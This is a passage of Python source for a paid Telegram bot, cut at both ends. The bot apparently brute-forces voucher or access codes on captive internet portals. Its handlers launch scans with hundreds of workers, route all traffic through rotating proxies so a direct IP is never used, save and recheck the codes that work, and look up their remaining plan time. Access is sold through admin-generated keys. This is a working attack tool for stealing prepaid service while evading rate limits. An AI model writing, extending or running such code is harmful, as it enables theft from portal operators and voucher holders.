        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, premium_emoji("📝 <b>Set your session URL</b>\n\n<code>/input YOUR_SESSION_URL</code>"), parse_mode="HTML")
        return

    url = args[1].strip()
    try:
        parsed = urlsplit(url)
        valid_url = parsed.scheme.lower() in ("http", "https") and bool(parsed.hostname)
    except ValueError:
        valid_url = False
    if not valid_url or any(char.isspace() for char in url):
        await bot.reply_to(message, premium_emoji(
            "⚠️ <b>Invalid session URL.</b> Send a complete HTTP or HTTPS URL with <code>/input URL</code>."),
            parse_mode="HTML")
        return
    # Simple URL check: portal host must be reachable through at least one
    # proxy. The challenge URL itself is never fetched (single-use).
    pm = get_proxy_manager()
    if pm.get_active_count() > 0:
        checking = await bot.reply_to(message, premium_emoji("🔍 <b>Checking URL...</b>"), parse_mode="HTML")
        url_ok = await validate_session_url(url)
        try:
            await bot.delete_message(message.chat.id, checking.message_id)
        except Exception:
            pass
        if not url_ok:
            await bot.reply_to(message, premium_emoji(
                "❌ <b>Wrong URL!</b>\n\nCouldn't reach it through proxies.\n"
                "Check the URL and try again with <code>/input URL</code>."),
                parse_mode="HTML")
            return
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]['session_url'] = url
    db_save_session_url(str(user_id), url)
    await bot.reply_to(message, premium_emoji(render_session_saved(url)), parse_mode="HTML",
                       reply_markup=menu_keyboard("modes", message.from_user.id))


@bot.message_handler(commands=['scan'])
async def scan(message):
    user_id = message.chat.id
    if not check_access(user_id):
        text = f"❌ <b>Your key has expired or not activated!</b>\n\n💳 Buy key: {ADMIN_CONTACT}"
        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, premium_emoji(render_modes(message.from_user.id)),
                           parse_mode="HTML", reply_markup=menu_keyboard("modes", message.from_user.id))
        return

    mode = args[1].strip()
    chat_id = message.chat.id
    if mode not in SCAN_MODES:
        await bot.reply_to(message, premium_emoji("⚠️ <b>Unknown scan mode.</b> Choose one from the list below."),
                           parse_mode="HTML", reply_markup=menu_keyboard("modes", message.from_user.id))
        return

    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, premium_emoji("❌ Please set session URL first with /input"), parse_mode="HTML")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, premium_emoji("⚠️ Scan already running! Use /stop to stop."), parse_mode="HTML")
        return

    await begin_scan(mode, chat_id, message, username=message.from_user.username)
    await bot.reply_to(message, premium_emoji(
        f"✅ <b>Scan started</b> · <code>{mode}</code> · {WORKERS} workers\nUse <code>/stop</code> anytime."), parse_mode="HTML")


async def _cancel_scan(chat_id):
    data = scan_tasks.get(chat_id)
    if not data or data["task"].done():
        return False
    scan_id = data["scan_id"]
    key = scan_key(chat_id, scan_id)
    data["stop"] = True
    workers = list(scan_workers.get(key, set()))
    for worker in workers:
        if not worker.done():
            worker.cancel()
    if workers:
        await asyncio.gather(*workers, return_exceptions=True)
    if not data["task"].done():
        data["task"].cancel()
    await asyncio.gather(data["task"], return_exceptions=True)
    clear_scan_state(chat_id, scan_id)
    return True


@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    args = message.text.split()
    target_id = message.chat.id
    if len(args) > 1:
        # Admin can stop another user's scan: /stop <user_id>
        if not is_admin(message.chat.id):
            await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
            return
        try:
            target_id = int(args[1].strip())
        except ValueError:
            await bot.reply_to(message, premium_emoji("📝 Usage: <code>/stop USER_ID</code>"), parse_mode="HTML")
            return
    if await _cancel_scan(target_id):
        if target_id != message.chat.id:
            await bot.reply_to(message, premium_emoji(f"🛑 <b>Scan stopped for <code>{target_id}</code>.</b>"), parse_mode="HTML")
        else:
            await bot.reply_to(message, premium_emoji("🛑 <b>Scan stopped.</b>\nSaved results are available with <code>/result</code>."), parse_mode="HTML")
    else:
        await bot.reply_to(message, premium_emoji("ℹ️ No active scan found."), parse_mode="HTML")


@bot.message_handler(commands=['stopall'])
async def stop_all_scans(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    if not scan_tasks:
        await bot.reply_to(message, premium_emoji("📭 No active scans found."), parse_mode="HTML")
        return
    stopped = 0
    for chat_id in list(scan_tasks.keys()):
        if await _cancel_scan(chat_id):
            stopped += 1
    await bot.reply_to(message, premium_emoji(f"🛑 <b>Stopped {stopped} active scan(s)!</b>"), parse_mode="HTML")


@bot.message_handler(commands=['result'])
async def handle_result(message):
    user_id = str(message.chat.id)
    results = db_get_results(user_id)
    if results:
        header = f"📄 <b>Saved results</b> · {len(results)}\n{DIVIDER}\n"
        chunk = header
        for code in results:
            line = f"<code>{escape(str(code))}</code>\n"
            if len(chunk) + len(line) > 3900:
                await bot.send_message(message.chat.id, premium_emoji(chunk), parse_mode="HTML")
                chunk = "📄 <b>Results · continued</b>\n" + line
            else:
                chunk += line
        if chunk:
            await bot.reply_to(message, premium_emoji(chunk), parse_mode="HTML",
                               reply_markup=menu_keyboard("results", message.from_user.id))
    else:
        await bot.reply_to(message, premium_emoji(render_results(message.from_user.id)),
                           parse_mode="HTML", reply_markup=menu_keyboard("results", message.from_user.id))


@bot.message_handler(commands=['recheck'])
async def recheck(message):
    user_id = message.chat.id
    if not check_access(user_id):
        text = f"❌ <b>Your key has expired or not activated!</b>\n\n💳 Buy key: {ADMIN_CONTACT}"
        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
        return

    chat_id = message.chat.id
    results = db_get_results(str(chat_id))
    if not results:
        await bot.reply_to(message, premium_emoji("📭 No codes to recheck."), parse_mode="HTML")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, premium_emoji("❌ Please set session URL first with /input"), parse_mode="HTML")
        return

    await bot.reply_to(message, premium_emoji(f"🔄 Rechecking {len(results)} codes..."), parse_mode="HTML")
    session_url = user_data[chat_id]["session_url"]
    pm = get_proxy_manager()
    proxy = await pm.get_next()
    if not proxy:
        await bot.reply_to(message, premium_emoji(
            "⚠️ <b>No proxies available.</b> Add proxies with <code>/proxy</code> first — direct IP is never used."),
            parse_mode="HTML")
        return
    connector = create_connector_for_proxy(proxy)
    headers = build_headers()
    valid = []
    try:
        async with aiohttp.ClientSession(connector=connector,
                                         timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as session:
            sid = await get_sid_from_gateway(session, session_url)
            if not sid:
                await bot.reply_to(message, premium_emoji("⚠️ Could not open a portal session."), parse_mode="HTML")
                return
            for code in results:
                res = await check_single_access_code(session, code, sid, headers, proxy)
                if res == "hit":
                    valid.append(code)
    finally:
        if connector is not None:
            try:
                await connector.close()
            except Exception:
                pass

    db_save_results(str(chat_id), valid)
    if valid:
        text = "✅ Still valid:\n\n" + "\n".join(f"<code>{escape(str(c))}</code>" for c in valid)
        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
    else:
        await bot.reply_to(message, premium_emoji("ℹ️ No saved codes are still valid."), parse_mode="HTML")


@bot.message_handler(commands=['code'])
async def check_code_manual(message):
    """Manually check one voucher code's remaining time using the remembered
    session URL (the one last set via /input)."""
    user_id = message.chat.id
    if not check_access(user_id):
        text = f"❌ <b>Your key has expired or not activated!</b>\n\n💳 Buy key: {ADMIN_CONTACT}"
        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
        return

    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, premium_emoji(
            "📝 <b>Check a code's remaining time</b>\n\n<code>/code 123456</code>"),
            parse_mode="HTML")
        return
    code = args[1].strip()

    # Prefer the session URL where THIS code was originally found;
    # fall back to the latest remembered session, then in-memory.
    session_url = db_get_code_session(code)
    if not session_url:
        session_url = db_get_session_url(str(user_id))
    if not session_url:
        session_url = user_data.get(user_id, {}).get('session_url')
    if not session_url:
        await bot.reply_to(message, premium_emoji(
            "❌ <b>No saved session.</b>\n\nI don't have a session URL remembered for you.\n"
            "Set one first with <code>/input YOUR_URL</code>."),
            parse_mode="HTML")
        return

    pm = get_proxy_manager()
    proxy = await pm.get_next()
    if not proxy:
        await bot.reply_to(message, premium_emoji(
            "⚠️ <b>No proxies available.</b> Add proxies with <code>/proxy</code> first — direct IP is never used."),
            parse_mode="HTML")
        return

    status_msg = await bot.reply_to(message, premium_emoji(
        f"🔍 Checking <code>{escape(code)}</code>..."), parse_mode="HTML")

    connector = create_connector_for_proxy(proxy)
    headers = build_headers()
    reply_text = None
    try:
        async with aiohttp.ClientSession(connector=connector,
                                         timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as session:
            sid = await get_sid_from_gateway(session, session_url)
            if not sid:
                reply_text = ("⚠️ <b>Couldn't open a portal session.</b>\n"
                              "The saved URL may be expired — set a fresh one with <code>/input</code>.")
            else:
                result = await check_single_access_code(session, code, sid, headers, proxy)
                if result == "hit":
                    plan, time_str = await fetch_balance(session, sid)
                    reply_text = (f"💳 <code>{escape(code)}</code>\n"
                                  f"   📋 {escape(str(plan))} | ⏳ {escape(str(time_str))}")
                elif result == "limit":
                    reply_text = "⚠️ <b>Rate limited.</b> Try again in a bit."
                elif result == "bad":
                    reply_text = f"❌ <code>{escape(code)}</code> — <b>invalid code.</b>"
                else:
                    reply_text = "⚠️ <b>Network error.</b> Try again."
                    await pm.mark_bad(proxy)
    finally:
        if connector is not None:
            try:
                await connector.close()
            except Exception:
                pass

    try:
        await bot.delete_message(message.chat.id, status_msg.message_id)
    except Exception:
        pass
    if reply_text:
        await bot.reply_to(message, premium_emoji(reply_text), parse_mode="HTML")


@bot.message_handler(commands=['bo'])
async def broadcast(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, premium_emoji("📝 Usage: <code>/bo YOUR_MESSAGE</code>"), parse_mode="HTML")
        return

    broadcast_text = escape(args[1].strip())
    users = db_get_all_users()
    if not users:
        await bot.reply_to(message, premium_emoji("📭 No users found."), parse_mode="HTML")
        return

    status_msg = await bot.reply_to(message, premium_emoji(f"📢 Broadcasting to {len(users)} users..."), parse_mode="HTML")
    success = 0
    failed = 0
    for uid in users:
        try:
            await bot.send_message(chat_id=int(uid),
                                   text=premium_emoji(f"📢 <b>Broadcast</b>\n\n{broadcast_text}"),
                                   parse_mode="HTML")
            success += 1
        except Exception as e:
            failed += 1
            print(f"[broadcast] failed uid={uid}: {e}")
        await asyncio.sleep(0.05)

    text = (f"📢 <b>Broadcast Completed</b>\n\n"
            f"✅ Sent: {success}\n"
            f"❌ Failed: {failed}\n"
            f"👥 Total: {len(users)}")
    try:
        await bot.edit_message_text(premium_emoji(text), status_msg.chat.id, status_msg.message_id, parse_mode="HTML")
    except Exception as e:
        print(f"[broadcast] edit error: {e}")


@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ Admin access only."), parse_mode="HTML")
        return
    args = message.text.split()
    pm = get_proxy_manager()

    # /proxy reload
    if len(args) > 1 and args[1].lower() == "reload":
        pm.reload()
        total, bad = pm.stats()
        await bot.reply_to(message, premium_emoji(
            f"🔄 <b>Proxies reloaded</b>\n{DIVIDER}\n✅ Active: {total - bad}\n❄️ Cooling: {bad}"),
            parse_mode="HTML")
        return

    # /proxy — status only (adding moved to /addproxy)
    total, bad = pm.stats()
    bnum, bn, bsize = pm.rotation_info()
    rot_line = f"\n🔄 Rotation: batch {bnum}/{bn} ({bsize} active, every 3 min)" if bn else ""
    await bot.reply_to(message, premium_emoji(
        f"🌐 <b>Proxy status</b>\n{DIVIDER}\n"
        f"Source: <code>proxies.txt</code>\n"
        f"✅ Active: {total - bad}\n❄️ Cooling: {bad}\n📊 Total: {total}{rot_line}\n\n"
        "📥 Add: <code>/addproxy</code>\n"
        "🔍 Check & clean: <code>/chkproxy</code>\n"
        "🗑️ Remove: <code>/rmproxy</code>\n"
        "<code>/proxy reload</code> — reload proxies.txt\n"
        "⚠️ Empty = scan blocked (no direct IP)."),
        parse_mode="HTML")


@bot.message_handler(commands=['addproxy'])
async def addproxy_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ Admin access only."), parse_mode="HTML")
        return
    # source text: reply to a message OR inline after the command
    text = None
    reply = message.reply_to_message
    if reply and (reply.text or reply.caption):
        text = reply.text or reply.caption
    elif len(message.text.split(None, 1)) > 1:
        text = message.text.split(None, 1)[1]
    if not text or not text.strip():
        await bot.reply_to(message, premium_emoji(
            "📝 <b>Usage:</b>\n"
            "Reply to a proxy list with <code>/addproxy</code>, or:\n"
            "<code>/addproxy ip:port:user:pass</code>\n"
            "Formats: <code>ip:port:user:pass</code> or <code>http://ip:port</code>\n"
            "Only <b>live</b> proxies are added (auto-tested)."),
            parse_mode="HTML")
        return
    new_proxies, duplicates, invalid = parse_proxy_list(text)
    pm = get_proxy_manager()
    if not new_proxies:
        total, bad = pm.stats()
        await bot.reply_to(message, premium_emoji(
            f"📥 <b>Proxy import</b>\n{DIVIDER}\n"
            f"✅ Added: <code>0</code>\n"
            f"🔁 Duplicates skipped: <code>{duplicates}</code>\n"
            f"⚠️ Invalid lines: <code>{invalid}</code>\n"
            f"📊 Total now: <code>{total}</code>"),
            parse_mode="HTML")
        return
    status_msg = await bot.reply_to(message, premium_emoji(
        f"🔍 <b>Testing {len(new_proxies)} new proxie(s)...</b>\n"
        "Only live ones will be added (VPS-side check, not the portal)."),
        parse_mode="HTML")
    sem = asyncio.Semaphore(15)

    async def probe(proxy):
        async with sem:
            # Retry up to 3 attempts: one transient fail (connection reset,
            # busy event loop, burst throttling) must not skip a good proxy.
            for attempt in range(3):
                if await check_proxy_live(proxy):
                    return proxy, True
                if attempt < 2:
                    await asyncio.sleep(2)
            return proxy, False

    outcomes = await asyncio.gather(*(probe(p) for p in new_proxies))
    live = [p for p, ok in outcomes if ok]
    dead = len(new_proxies) - len(live)
    added = 0
    if live:
        try:
            with open(PROXY_FILE, "a") as f:
                for p in live:
                    f.write(p + "\n")
            added = len(live)
        except OSError as e:
            await bot.edit_message_text(
                f"⚠️ Could not write proxies file: {escape(str(e))}",
                chat_id=message.chat.id, message_id=status_msg.message_id,
                parse_mode="HTML")
            return
    pm.reload()
    total, bad = pm.stats()
    await bot.edit_message_text(premium_emoji(
        f"📥 <b>Proxy import</b>\n{DIVIDER}\n"
        f"✅ Added (live): <code>{added}</code>\n"
        f"💀 Dead (skipped): <code>{dead}</code>\n"
        f"🔁 Duplicates skipped: <code>{duplicates}</code>\n"
        f"⚠️ Invalid lines: <code>{invalid}</code>\n\n"
        f"📊 Total now: <code>{total}</code>"),
        chat_id=message.chat.id, message_id=status_msg.message_id,
        parse_mode="HTML")


@bot.message_handler(commands=['chkproxy'])
async def chkproxy_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ Admin access only."), parse_mode="HTML")
        return
    pm = get_proxy_manager()
    proxies = list(pm.proxies)
    if not proxies:
        await bot.reply_to(message, premium_emoji("📭 No proxies to check."), parse_mode="HTML")
        return
    status_msg = await bot.reply_to(message, premium_emoji(
        f"🔍 <b>Checking {len(proxies)} proxies...</b>\n"
        "VPS-side check via neutral endpoint (not the portal)."),
        parse_mode="HTML")
    sem = asyncio.Semaphore(15)

    async def probe(proxy):
        async with sem:
            for attempt in range(3):
                if await check_proxy_live(proxy):
                    return proxy, True
                if attempt < 2:
                    await asyncio.sleep(2)
            return proxy, False

    outcomes = await asyncio.gather(*(probe(p) for p in proxies))
    live = [p for p, ok in outcomes if ok]
    dead = [p for p, ok in outcomes if not ok]
    # Safety: if EVERYTHING failed, the check endpoint itself is likely down —
    # never wipe the whole list on that signal.
    if dead and not live:
        await bot.edit_message_text(premium_emoji(
            "⚠️ <b>All proxies failed the check</b> — the check endpoint itself "
            "may be down. Nothing was removed."),
            chat_id=message.chat.id, message_id=status_msg.message_id,
            parse_mode="HTML")
        return
    # Strike rule: a proxy is removed only after CHKPROXY_MAX_STRIKES
    # consecutive failed /chkproxy rounds — one transient fail never removes.
    strikes, to_remove = _update_chk_strikes(_load_chk_strikes(), live, dead)
    removed = 0
    if to_remove:
        remove_set = set(to_remove)
        remaining = [p for p in pm.proxies if p not in remove_set]
        try:
            with open(PROXY_FILE, "w") as f:
                for p in remaining:
                    f.write(p + "\n")
            removed = len(to_remove)
        except OSError as e:
            await bot.edit_message_text(
                f"⚠️ Could not update proxies file: {escape(str(e))}",
                chat_id=message.chat.id, message_id=status_msg.message_id,
                parse_mode="HTML")
            return
        pm.reload()
    current = set(pm.proxies)
    strikes = {p: n for p, n in strikes.items() if p in current}
    _save_chk_strikes(strikes)
    failed_kept = len(dead) - removed
    total, bad = pm.stats()
    await bot.edit_message_text(premium_emoji(
        f"🔍 <b>Proxy check complete</b>\n{DIVIDER}\n"
        f"✅ Live: <code>{len(live)}</code>\n"
        f"💀 Dead (removed, {CHKPROXY_MAX_STRIKES} strikes): <code>{removed}</code>\n"
        f"⚠️ Failed this round (kept): <code>{failed_kept}</code>\n\n"
        f"📊 Total now: <code>{total}</code>"),
        chat_id=message.chat.id, message_id=status_msg.message_id,
        parse_mode="HTML")


@bot.message_handler(commands=['rmproxy'])
async def rmproxy_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ Admin access only."), parse_mode="HTML")
        return
    parts = message.text.split(None, 1)
    if len(parts) < 2:
        await bot.reply_to(message, premium_emoji(
            "📝 <b>Usage:</b>\n"
            "<code>/rmproxy all</code> — remove ALL proxies\n"
            "<code>/rmproxy 1.2.3.4</code> — remove proxies containing this text"),
            parse_mode="HTML")
        return
    target = parts[1].strip()
    pm = get_proxy_manager()
    if target.lower() == "all":
        removed = len(pm.proxies)
        try:
            with open(PROXY_FILE, "w") as f:
                f.write("")
        except OSError as e:
            await bot.reply_to(message, premium_emoji(
                f"⚠️ Could not clear file: {escape(str(e))}"), parse_mode="HTML")
            return
        pm.reload()
        await bot.reply_to(message, premium_emoji(
            f"🗑️ <b>Removed all proxies</b> (<code>{removed}</code>).\n"
            "Add new ones with <code>/addproxy</code>."), parse_mode="HTML")
        return
    needle = target.lower()
    matched = [p for p in pm.proxies if needle in p.lower()]
    if not matched:
        await bot.reply_to(message, premium_emoji("ℹ️ No proxies matched."), parse_mode="HTML")
        return
    remaining = [p for p in pm.proxies if needle not in p.lower()]
    try:
        with open(PROXY_FILE, "w") as f:
            for p in remaining:
                f.write(p + "\n")
    except OSError as e:
        await bot.reply_to(message, premium_emoji(
            f"⚠️ Could not update file: {escape(str(e))}"), parse_mode="HTML")
        return
    pm.reload()
    await bot.reply_to(message, premium_emoji(
        f"🗑️ Removed <code>{len(matched)}</code> proxie(s). <code>{len(remaining)}</code> left."),
        parse_mode="HTML")


@bot.message_handler(commands=['status'])
async def status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    keys = db_get_all_keys()
    users = db_get_all_users()
    active_scans = sum(1 for data in scan_tasks.values()
                       if data.get("task") and not data["task"].done())
    approved_users = sum(1 for uid in users if is_key_valid(uid))
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    pm = get_proxy_manager()
    total, bad = pm.stats()
    text = (f"📊 <b>{BOT_NAME} · Bot status</b>\n{DIVIDER}\n"
            f"<b>Uptime</b>          {hours}h {minutes}m {seconds}s\n"
            f"<b>Active scans</b>    {active_scans}\n"
            f"<b>Approved users</b>  {approved_users}\n"
            f"<b>Total users</b>     {len(users)}\n"
            f"<b>Total keys</b>      {len(keys)}\n\n"
            f"🌐 <b>Connection</b>\n"
            f"Proxy file · {total - bad} active / {bad} cooling\n\n"
            f"🔥 <b>Scan settings</b>\n"
            f"Workers  <code>{WORKERS}</code>\n"
            f"Modes    <code>{', '.join(SCAN_MODES)}</code>\n\n"
            f"💎 <b>Admin</b>  <code>{ADMIN_ID}</code>")
    await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")


@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return

    args = message.text.split()
    if len(args) < 3:
        text = ("📝 <b>Usage:</b>\n"
                "<code>/genkey PLAN USER_ID</code> — single key for user\n"
                "<code>/genkey PLAN COUNT USER_ID</code> — multiple keys for user\n"
                "<code>/genkey PLAN COUNT user</code> — multiple generic keys (any user)\n\n"
                "<b>Plans:</b> 1h, 1d, 7d, 10d, 15d, 1m, 1y, unlimited\n\n"
                "<b>Examples:</b>\n"
                "<code>/genkey 7d 5115562507</code>\n"
                "<code>/genkey 1h 10 5115562507</code>\n"
                "<code>/genkey 1h 10 user</code>")
        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
        return

    plan = args[1]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, premium_emoji("❌ Invalid plan. Use: 1h, 1d, 7d, 10d, 15d, 1m, 1y, unlimited"), parse_mode="HTML")
        return

    if len(args) == 3:
        count = 1
        user_id = args[2].strip()
    else:
        try:
            count = int(args[2])
        except ValueError:
            await bot.reply_to(message, premium_emoji("❌ Count must be a number."), parse_mode="HTML")
            return
        if count < 1 or count > 100:
            await bot.reply_to(message, premium_emoji("❌ Count must be between 1 and 100"), parse_mode="HTML")
            return
        target = args[3].strip()
        user_id = None if target.lower() == "user" else target

    new_keys = []
    for _ in range(count):
        k = generate_random_key()
        db_add_key(k, user_id, plan, expiry)
        new_keys.append(k)

    uid_display = user_id if user_id else "GENERIC (any user)"
    if count == 1:
        text = (f"✅ <b>Key Generated!</b>\n\n"
                f"🔑 KEY: <code>{new_keys[0]}</code>\n"
                f"👤 USER ID: <code>{uid_display}</code>\n"
                f"📋 PLAN: <code>{plan}</code>\n"
                f"⏳ EXPIRES: <code>{expiry}</code>\n\n"
                f"User can use: <code>/key {new_keys[0]}</code> to activate.")
        await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")
    else:
        header = (f"✅ <b>{count} Keys Generated!</b>\n\n"
                  f"👤 USER ID: <code>{uid_display}</code>\n"
                  f"📋 PLAN: <code>{plan}</code>\n"
                  f"⏳ EXPIRES: <code>{expiry}</code>\n\n"
                  f"🔑 <b>KEYS:</b>\n")
        keys_text = "\n".join(f"{i+1}. <code>{k}</code>" for i, k in enumerate(new_keys))
        full = header + keys_text
        if len(full) > 4000:
            await bot.send_message(message.chat.id, premium_emoji(header), parse_mode="HTML")
            chunk = ""
            for line in keys_text.split("\n"):
                if len(chunk) + len(line) + 1 > 4000:
                    await bot.send_message(message.chat.id, premium_emoji(chunk), parse_mode="HTML")
                    chunk = line
                else:
                    chunk = (chunk + "\n" + line) if chunk else line
            if chunk:
                await bot.send_message(message.chat.id, premium_emoji(chunk), parse_mode="HTML")
        else:
            await bot.reply_to(message, premium_emoji(full), parse_mode="HTML")


@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, premium_emoji("📝 Usage: <code>/delkey KEY</code>"), parse_mode="HTML")
        return
    key = args[1].strip()
    if not db_get_key(key):
        await bot.reply_to(message, premium_emoji("❌ Key not found."), parse_mode="HTML")
        return
    db_delete_key(key)
    await bot.reply_to(message, premium_emoji(f"✅ Key <code>{key}</code> deleted successfully."), parse_mode="HTML")


@bot.message_handler(commands=['delexp'])
async def delexp(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    keys = db_get_all_keys()
    expired = [k for k, d in keys.items() if not check_key_expiration(d["expires_at"])]
    for k in expired:
        db_delete_key(k)
    await bot.reply_to(message, premium_emoji(
        f"🗑️ <b>Deleted {len(expired)} expired key(s).</b>\n"
        f"📊 {len(keys) - len(expired)} key(s) remaining."), parse_mode="HTML")


@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    keys = db_get_all_keys()
    if not keys:
        await bot.reply_to(message, premium_emoji("📭 No keys found."), parse_mode="HTML")
        return
    lines = []
    for key, data in keys.items():
        expires = data["expires_at"]
        if expires == "9999-12-31T23:59:59Z":
            expires_str = "♾️ Unlimited"
        else:
            try:
                exp_time = datetime.datetime.fromisoformat(expires.replace("Z", "+00:00"))
                now = datetime.datetime.now(datetime.timezone.utc)
                if exp_time < now:
                    expires_str = "⏰ Expired"
                else:
                    diff = exp_time - now
                    days = diff.days
                    hours, rem = divmod(diff.seconds, 3600)
                    minutes = rem // 60
                    expires_str = f"{days}d {hours}h {minutes}m"
            except Exception:
                expires_str = expires
        uid = data["user_id"]
        if uid:
            uname = db_get_username(uid)
            uid_display = f"<code>{uid}</code>" + (f" @{escape(uname)}" if uname else "")
        else:
            uid_display = "GENERIC (any user)"
        lines.append(f"🔑 <code>{key}</code>\n   👤 {uid_display}\n   📋 {data['plan']}\n   ⏳ {expires_str}")
    chunk = f"🔑 <b>Keys ({len(keys)})</b>\n{DIVIDER}\n"
    for line in lines:
        if len(premium_emoji(chunk + line)) > 3800:
            await bot.send_message(message.chat.id, premium_emoji(chunk), parse_mode="HTML")
            chunk = "🔑 <b>Keys · continued</b>\n"
        chunk += line + "\n\n"
    await bot.reply_to(message, premium_emoji(chunk), parse_mode="HTML")


@bot.message_handler(commands=['setconcurrency'])
async def set_concurrency(message):
    global WORKERS
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await bot.reply_to(message, premium_emoji(f"⚡ Current Workers: <code>{WORKERS}</code>\n📝 Usage: <code>/setconcurrency 700</code>"), parse_mode="HTML")
        return
    if int(args[1]) < 1:
        await bot.reply_to(message, premium_emoji("⚠️ Worker count must be positive."), parse_mode="HTML")
        return
    WORKERS = int(args[1])
    await bot.reply_to(message, premium_emoji(f"✅ Workers set to <code>{WORKERS}</code>\nℹ️ Applies to new scans."), parse_mode="HTML")


@bot.message_handler(commands=['setpool'])
async def set_pool(message):
    global ACTIVE_PROXY_COUNT
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    args = message.text.split()
    if len(args) < 2:
        cur = "all" if ACTIVE_PROXY_COUNT <= 0 else str(ACTIVE_PROXY_COUNT)
        await bot.reply_to(message, premium_emoji(f"🌐 Current proxy pool: <code>{cur}</code>\n📝 Usage: <code>/setpool 5</code> or <code>/setpool all</code>"), parse_mode="HTML")
        return
    arg = args[1].lower()
    if arg == "all":
        ACTIVE_PROXY_COUNT = 0
    elif arg.isdigit() and int(arg) >= 1:
        ACTIVE_PROXY_COUNT = int(arg)
    else:
        await bot.reply_to(message, premium_emoji("📝 Usage: <code>/setpool 5</code> or <code>/setpool all</code>"), parse_mode="HTML")
        return
    get_proxy_manager().reset_rotation()
    mode = "all proxies (no batching)" if ACTIVE_PROXY_COUNT <= 0 else f"{ACTIVE_PROXY_COUNT} per batch"
    await bot.reply_to(message, premium_emoji(f"✅ Proxy pool set to <code>{arg}</code> — {mode}.\n🔄 Rotation restarted at batch 1."), parse_mode="HTML")


@bot.message_handler(commands=['exp'])
async def toggle_expired(message):
    global SHOW_EXPIRED
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    args = message.text.split()
    if len(args) < 2 or args[1].lower() not in ("on", "off"):
        state = "ON" if SHOW_EXPIRED else "OFF"
        await bot.reply_to(message, premium_emoji(f"⏳ Expired display: <b>{state}</b>\n📝 Usage: <code>/exp on</code> or <code>/exp off</code>"), parse_mode="HTML")
        return
    SHOW_EXPIRED = args[1].lower() == "on"
    _save_show_expired(SHOW_EXPIRED)
    state = "ON — expired codes will be shown in their own group" if SHOW_EXPIRED else "OFF — expired codes will be hidden"
    await bot.reply_to(message, premium_emoji(f"✅ Expired display: <b>{state}</b>\nℹ️ Applies to new scans."), parse_mode="HTML")


@bot.message_handler(commands=['stats'])
async def scan_stats(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, premium_emoji("❌ No Permission"), parse_mode="HTML")
        return
    active = {cid: d for cid, d in scan_tasks.items() if not d["task"].done()}
    if not active:
        await bot.reply_to(message, premium_emoji("📭 No active scans running."), parse_mode="HTML")
        return
    lines = [f"📡 <b>Live Scan Stats ({len(active)} active)</b>\n"]
    for cid, d in active.items():
        key = scan_key(cid, d["scan_id"])
        checked = d.get("checked", 0)
        speed = d.get("speed", 0)
        found = len(success_texts.get(key, []))
        mode = d.get("mode", "?")
        elapsed_s = int(time.monotonic() - d.get("start_time", time.monotonic()))
        h, rem = divmod(elapsed_s, 3600)
        m, s = divmod(rem, 60)
        elapsed_str = f"{h}h {m}m {s}s" if h else f"{m}m {s}s"
        retries = retry_counts.get(key, 0)
        uname = d.get("username") or db_get_username(cid)
        user_line = f"👤 User: {cid}"
        if uname:
            user_line += f"\n📝 Username: @{escape(uname)}"
        lines.append(f"{user_line}\n🎯 Mode: {mode}\n📦 Checked: {checked:,}\n"
                     f"⚡ Speed: {speed:,.0f} codes/min\n✅ Found: {found}\n"
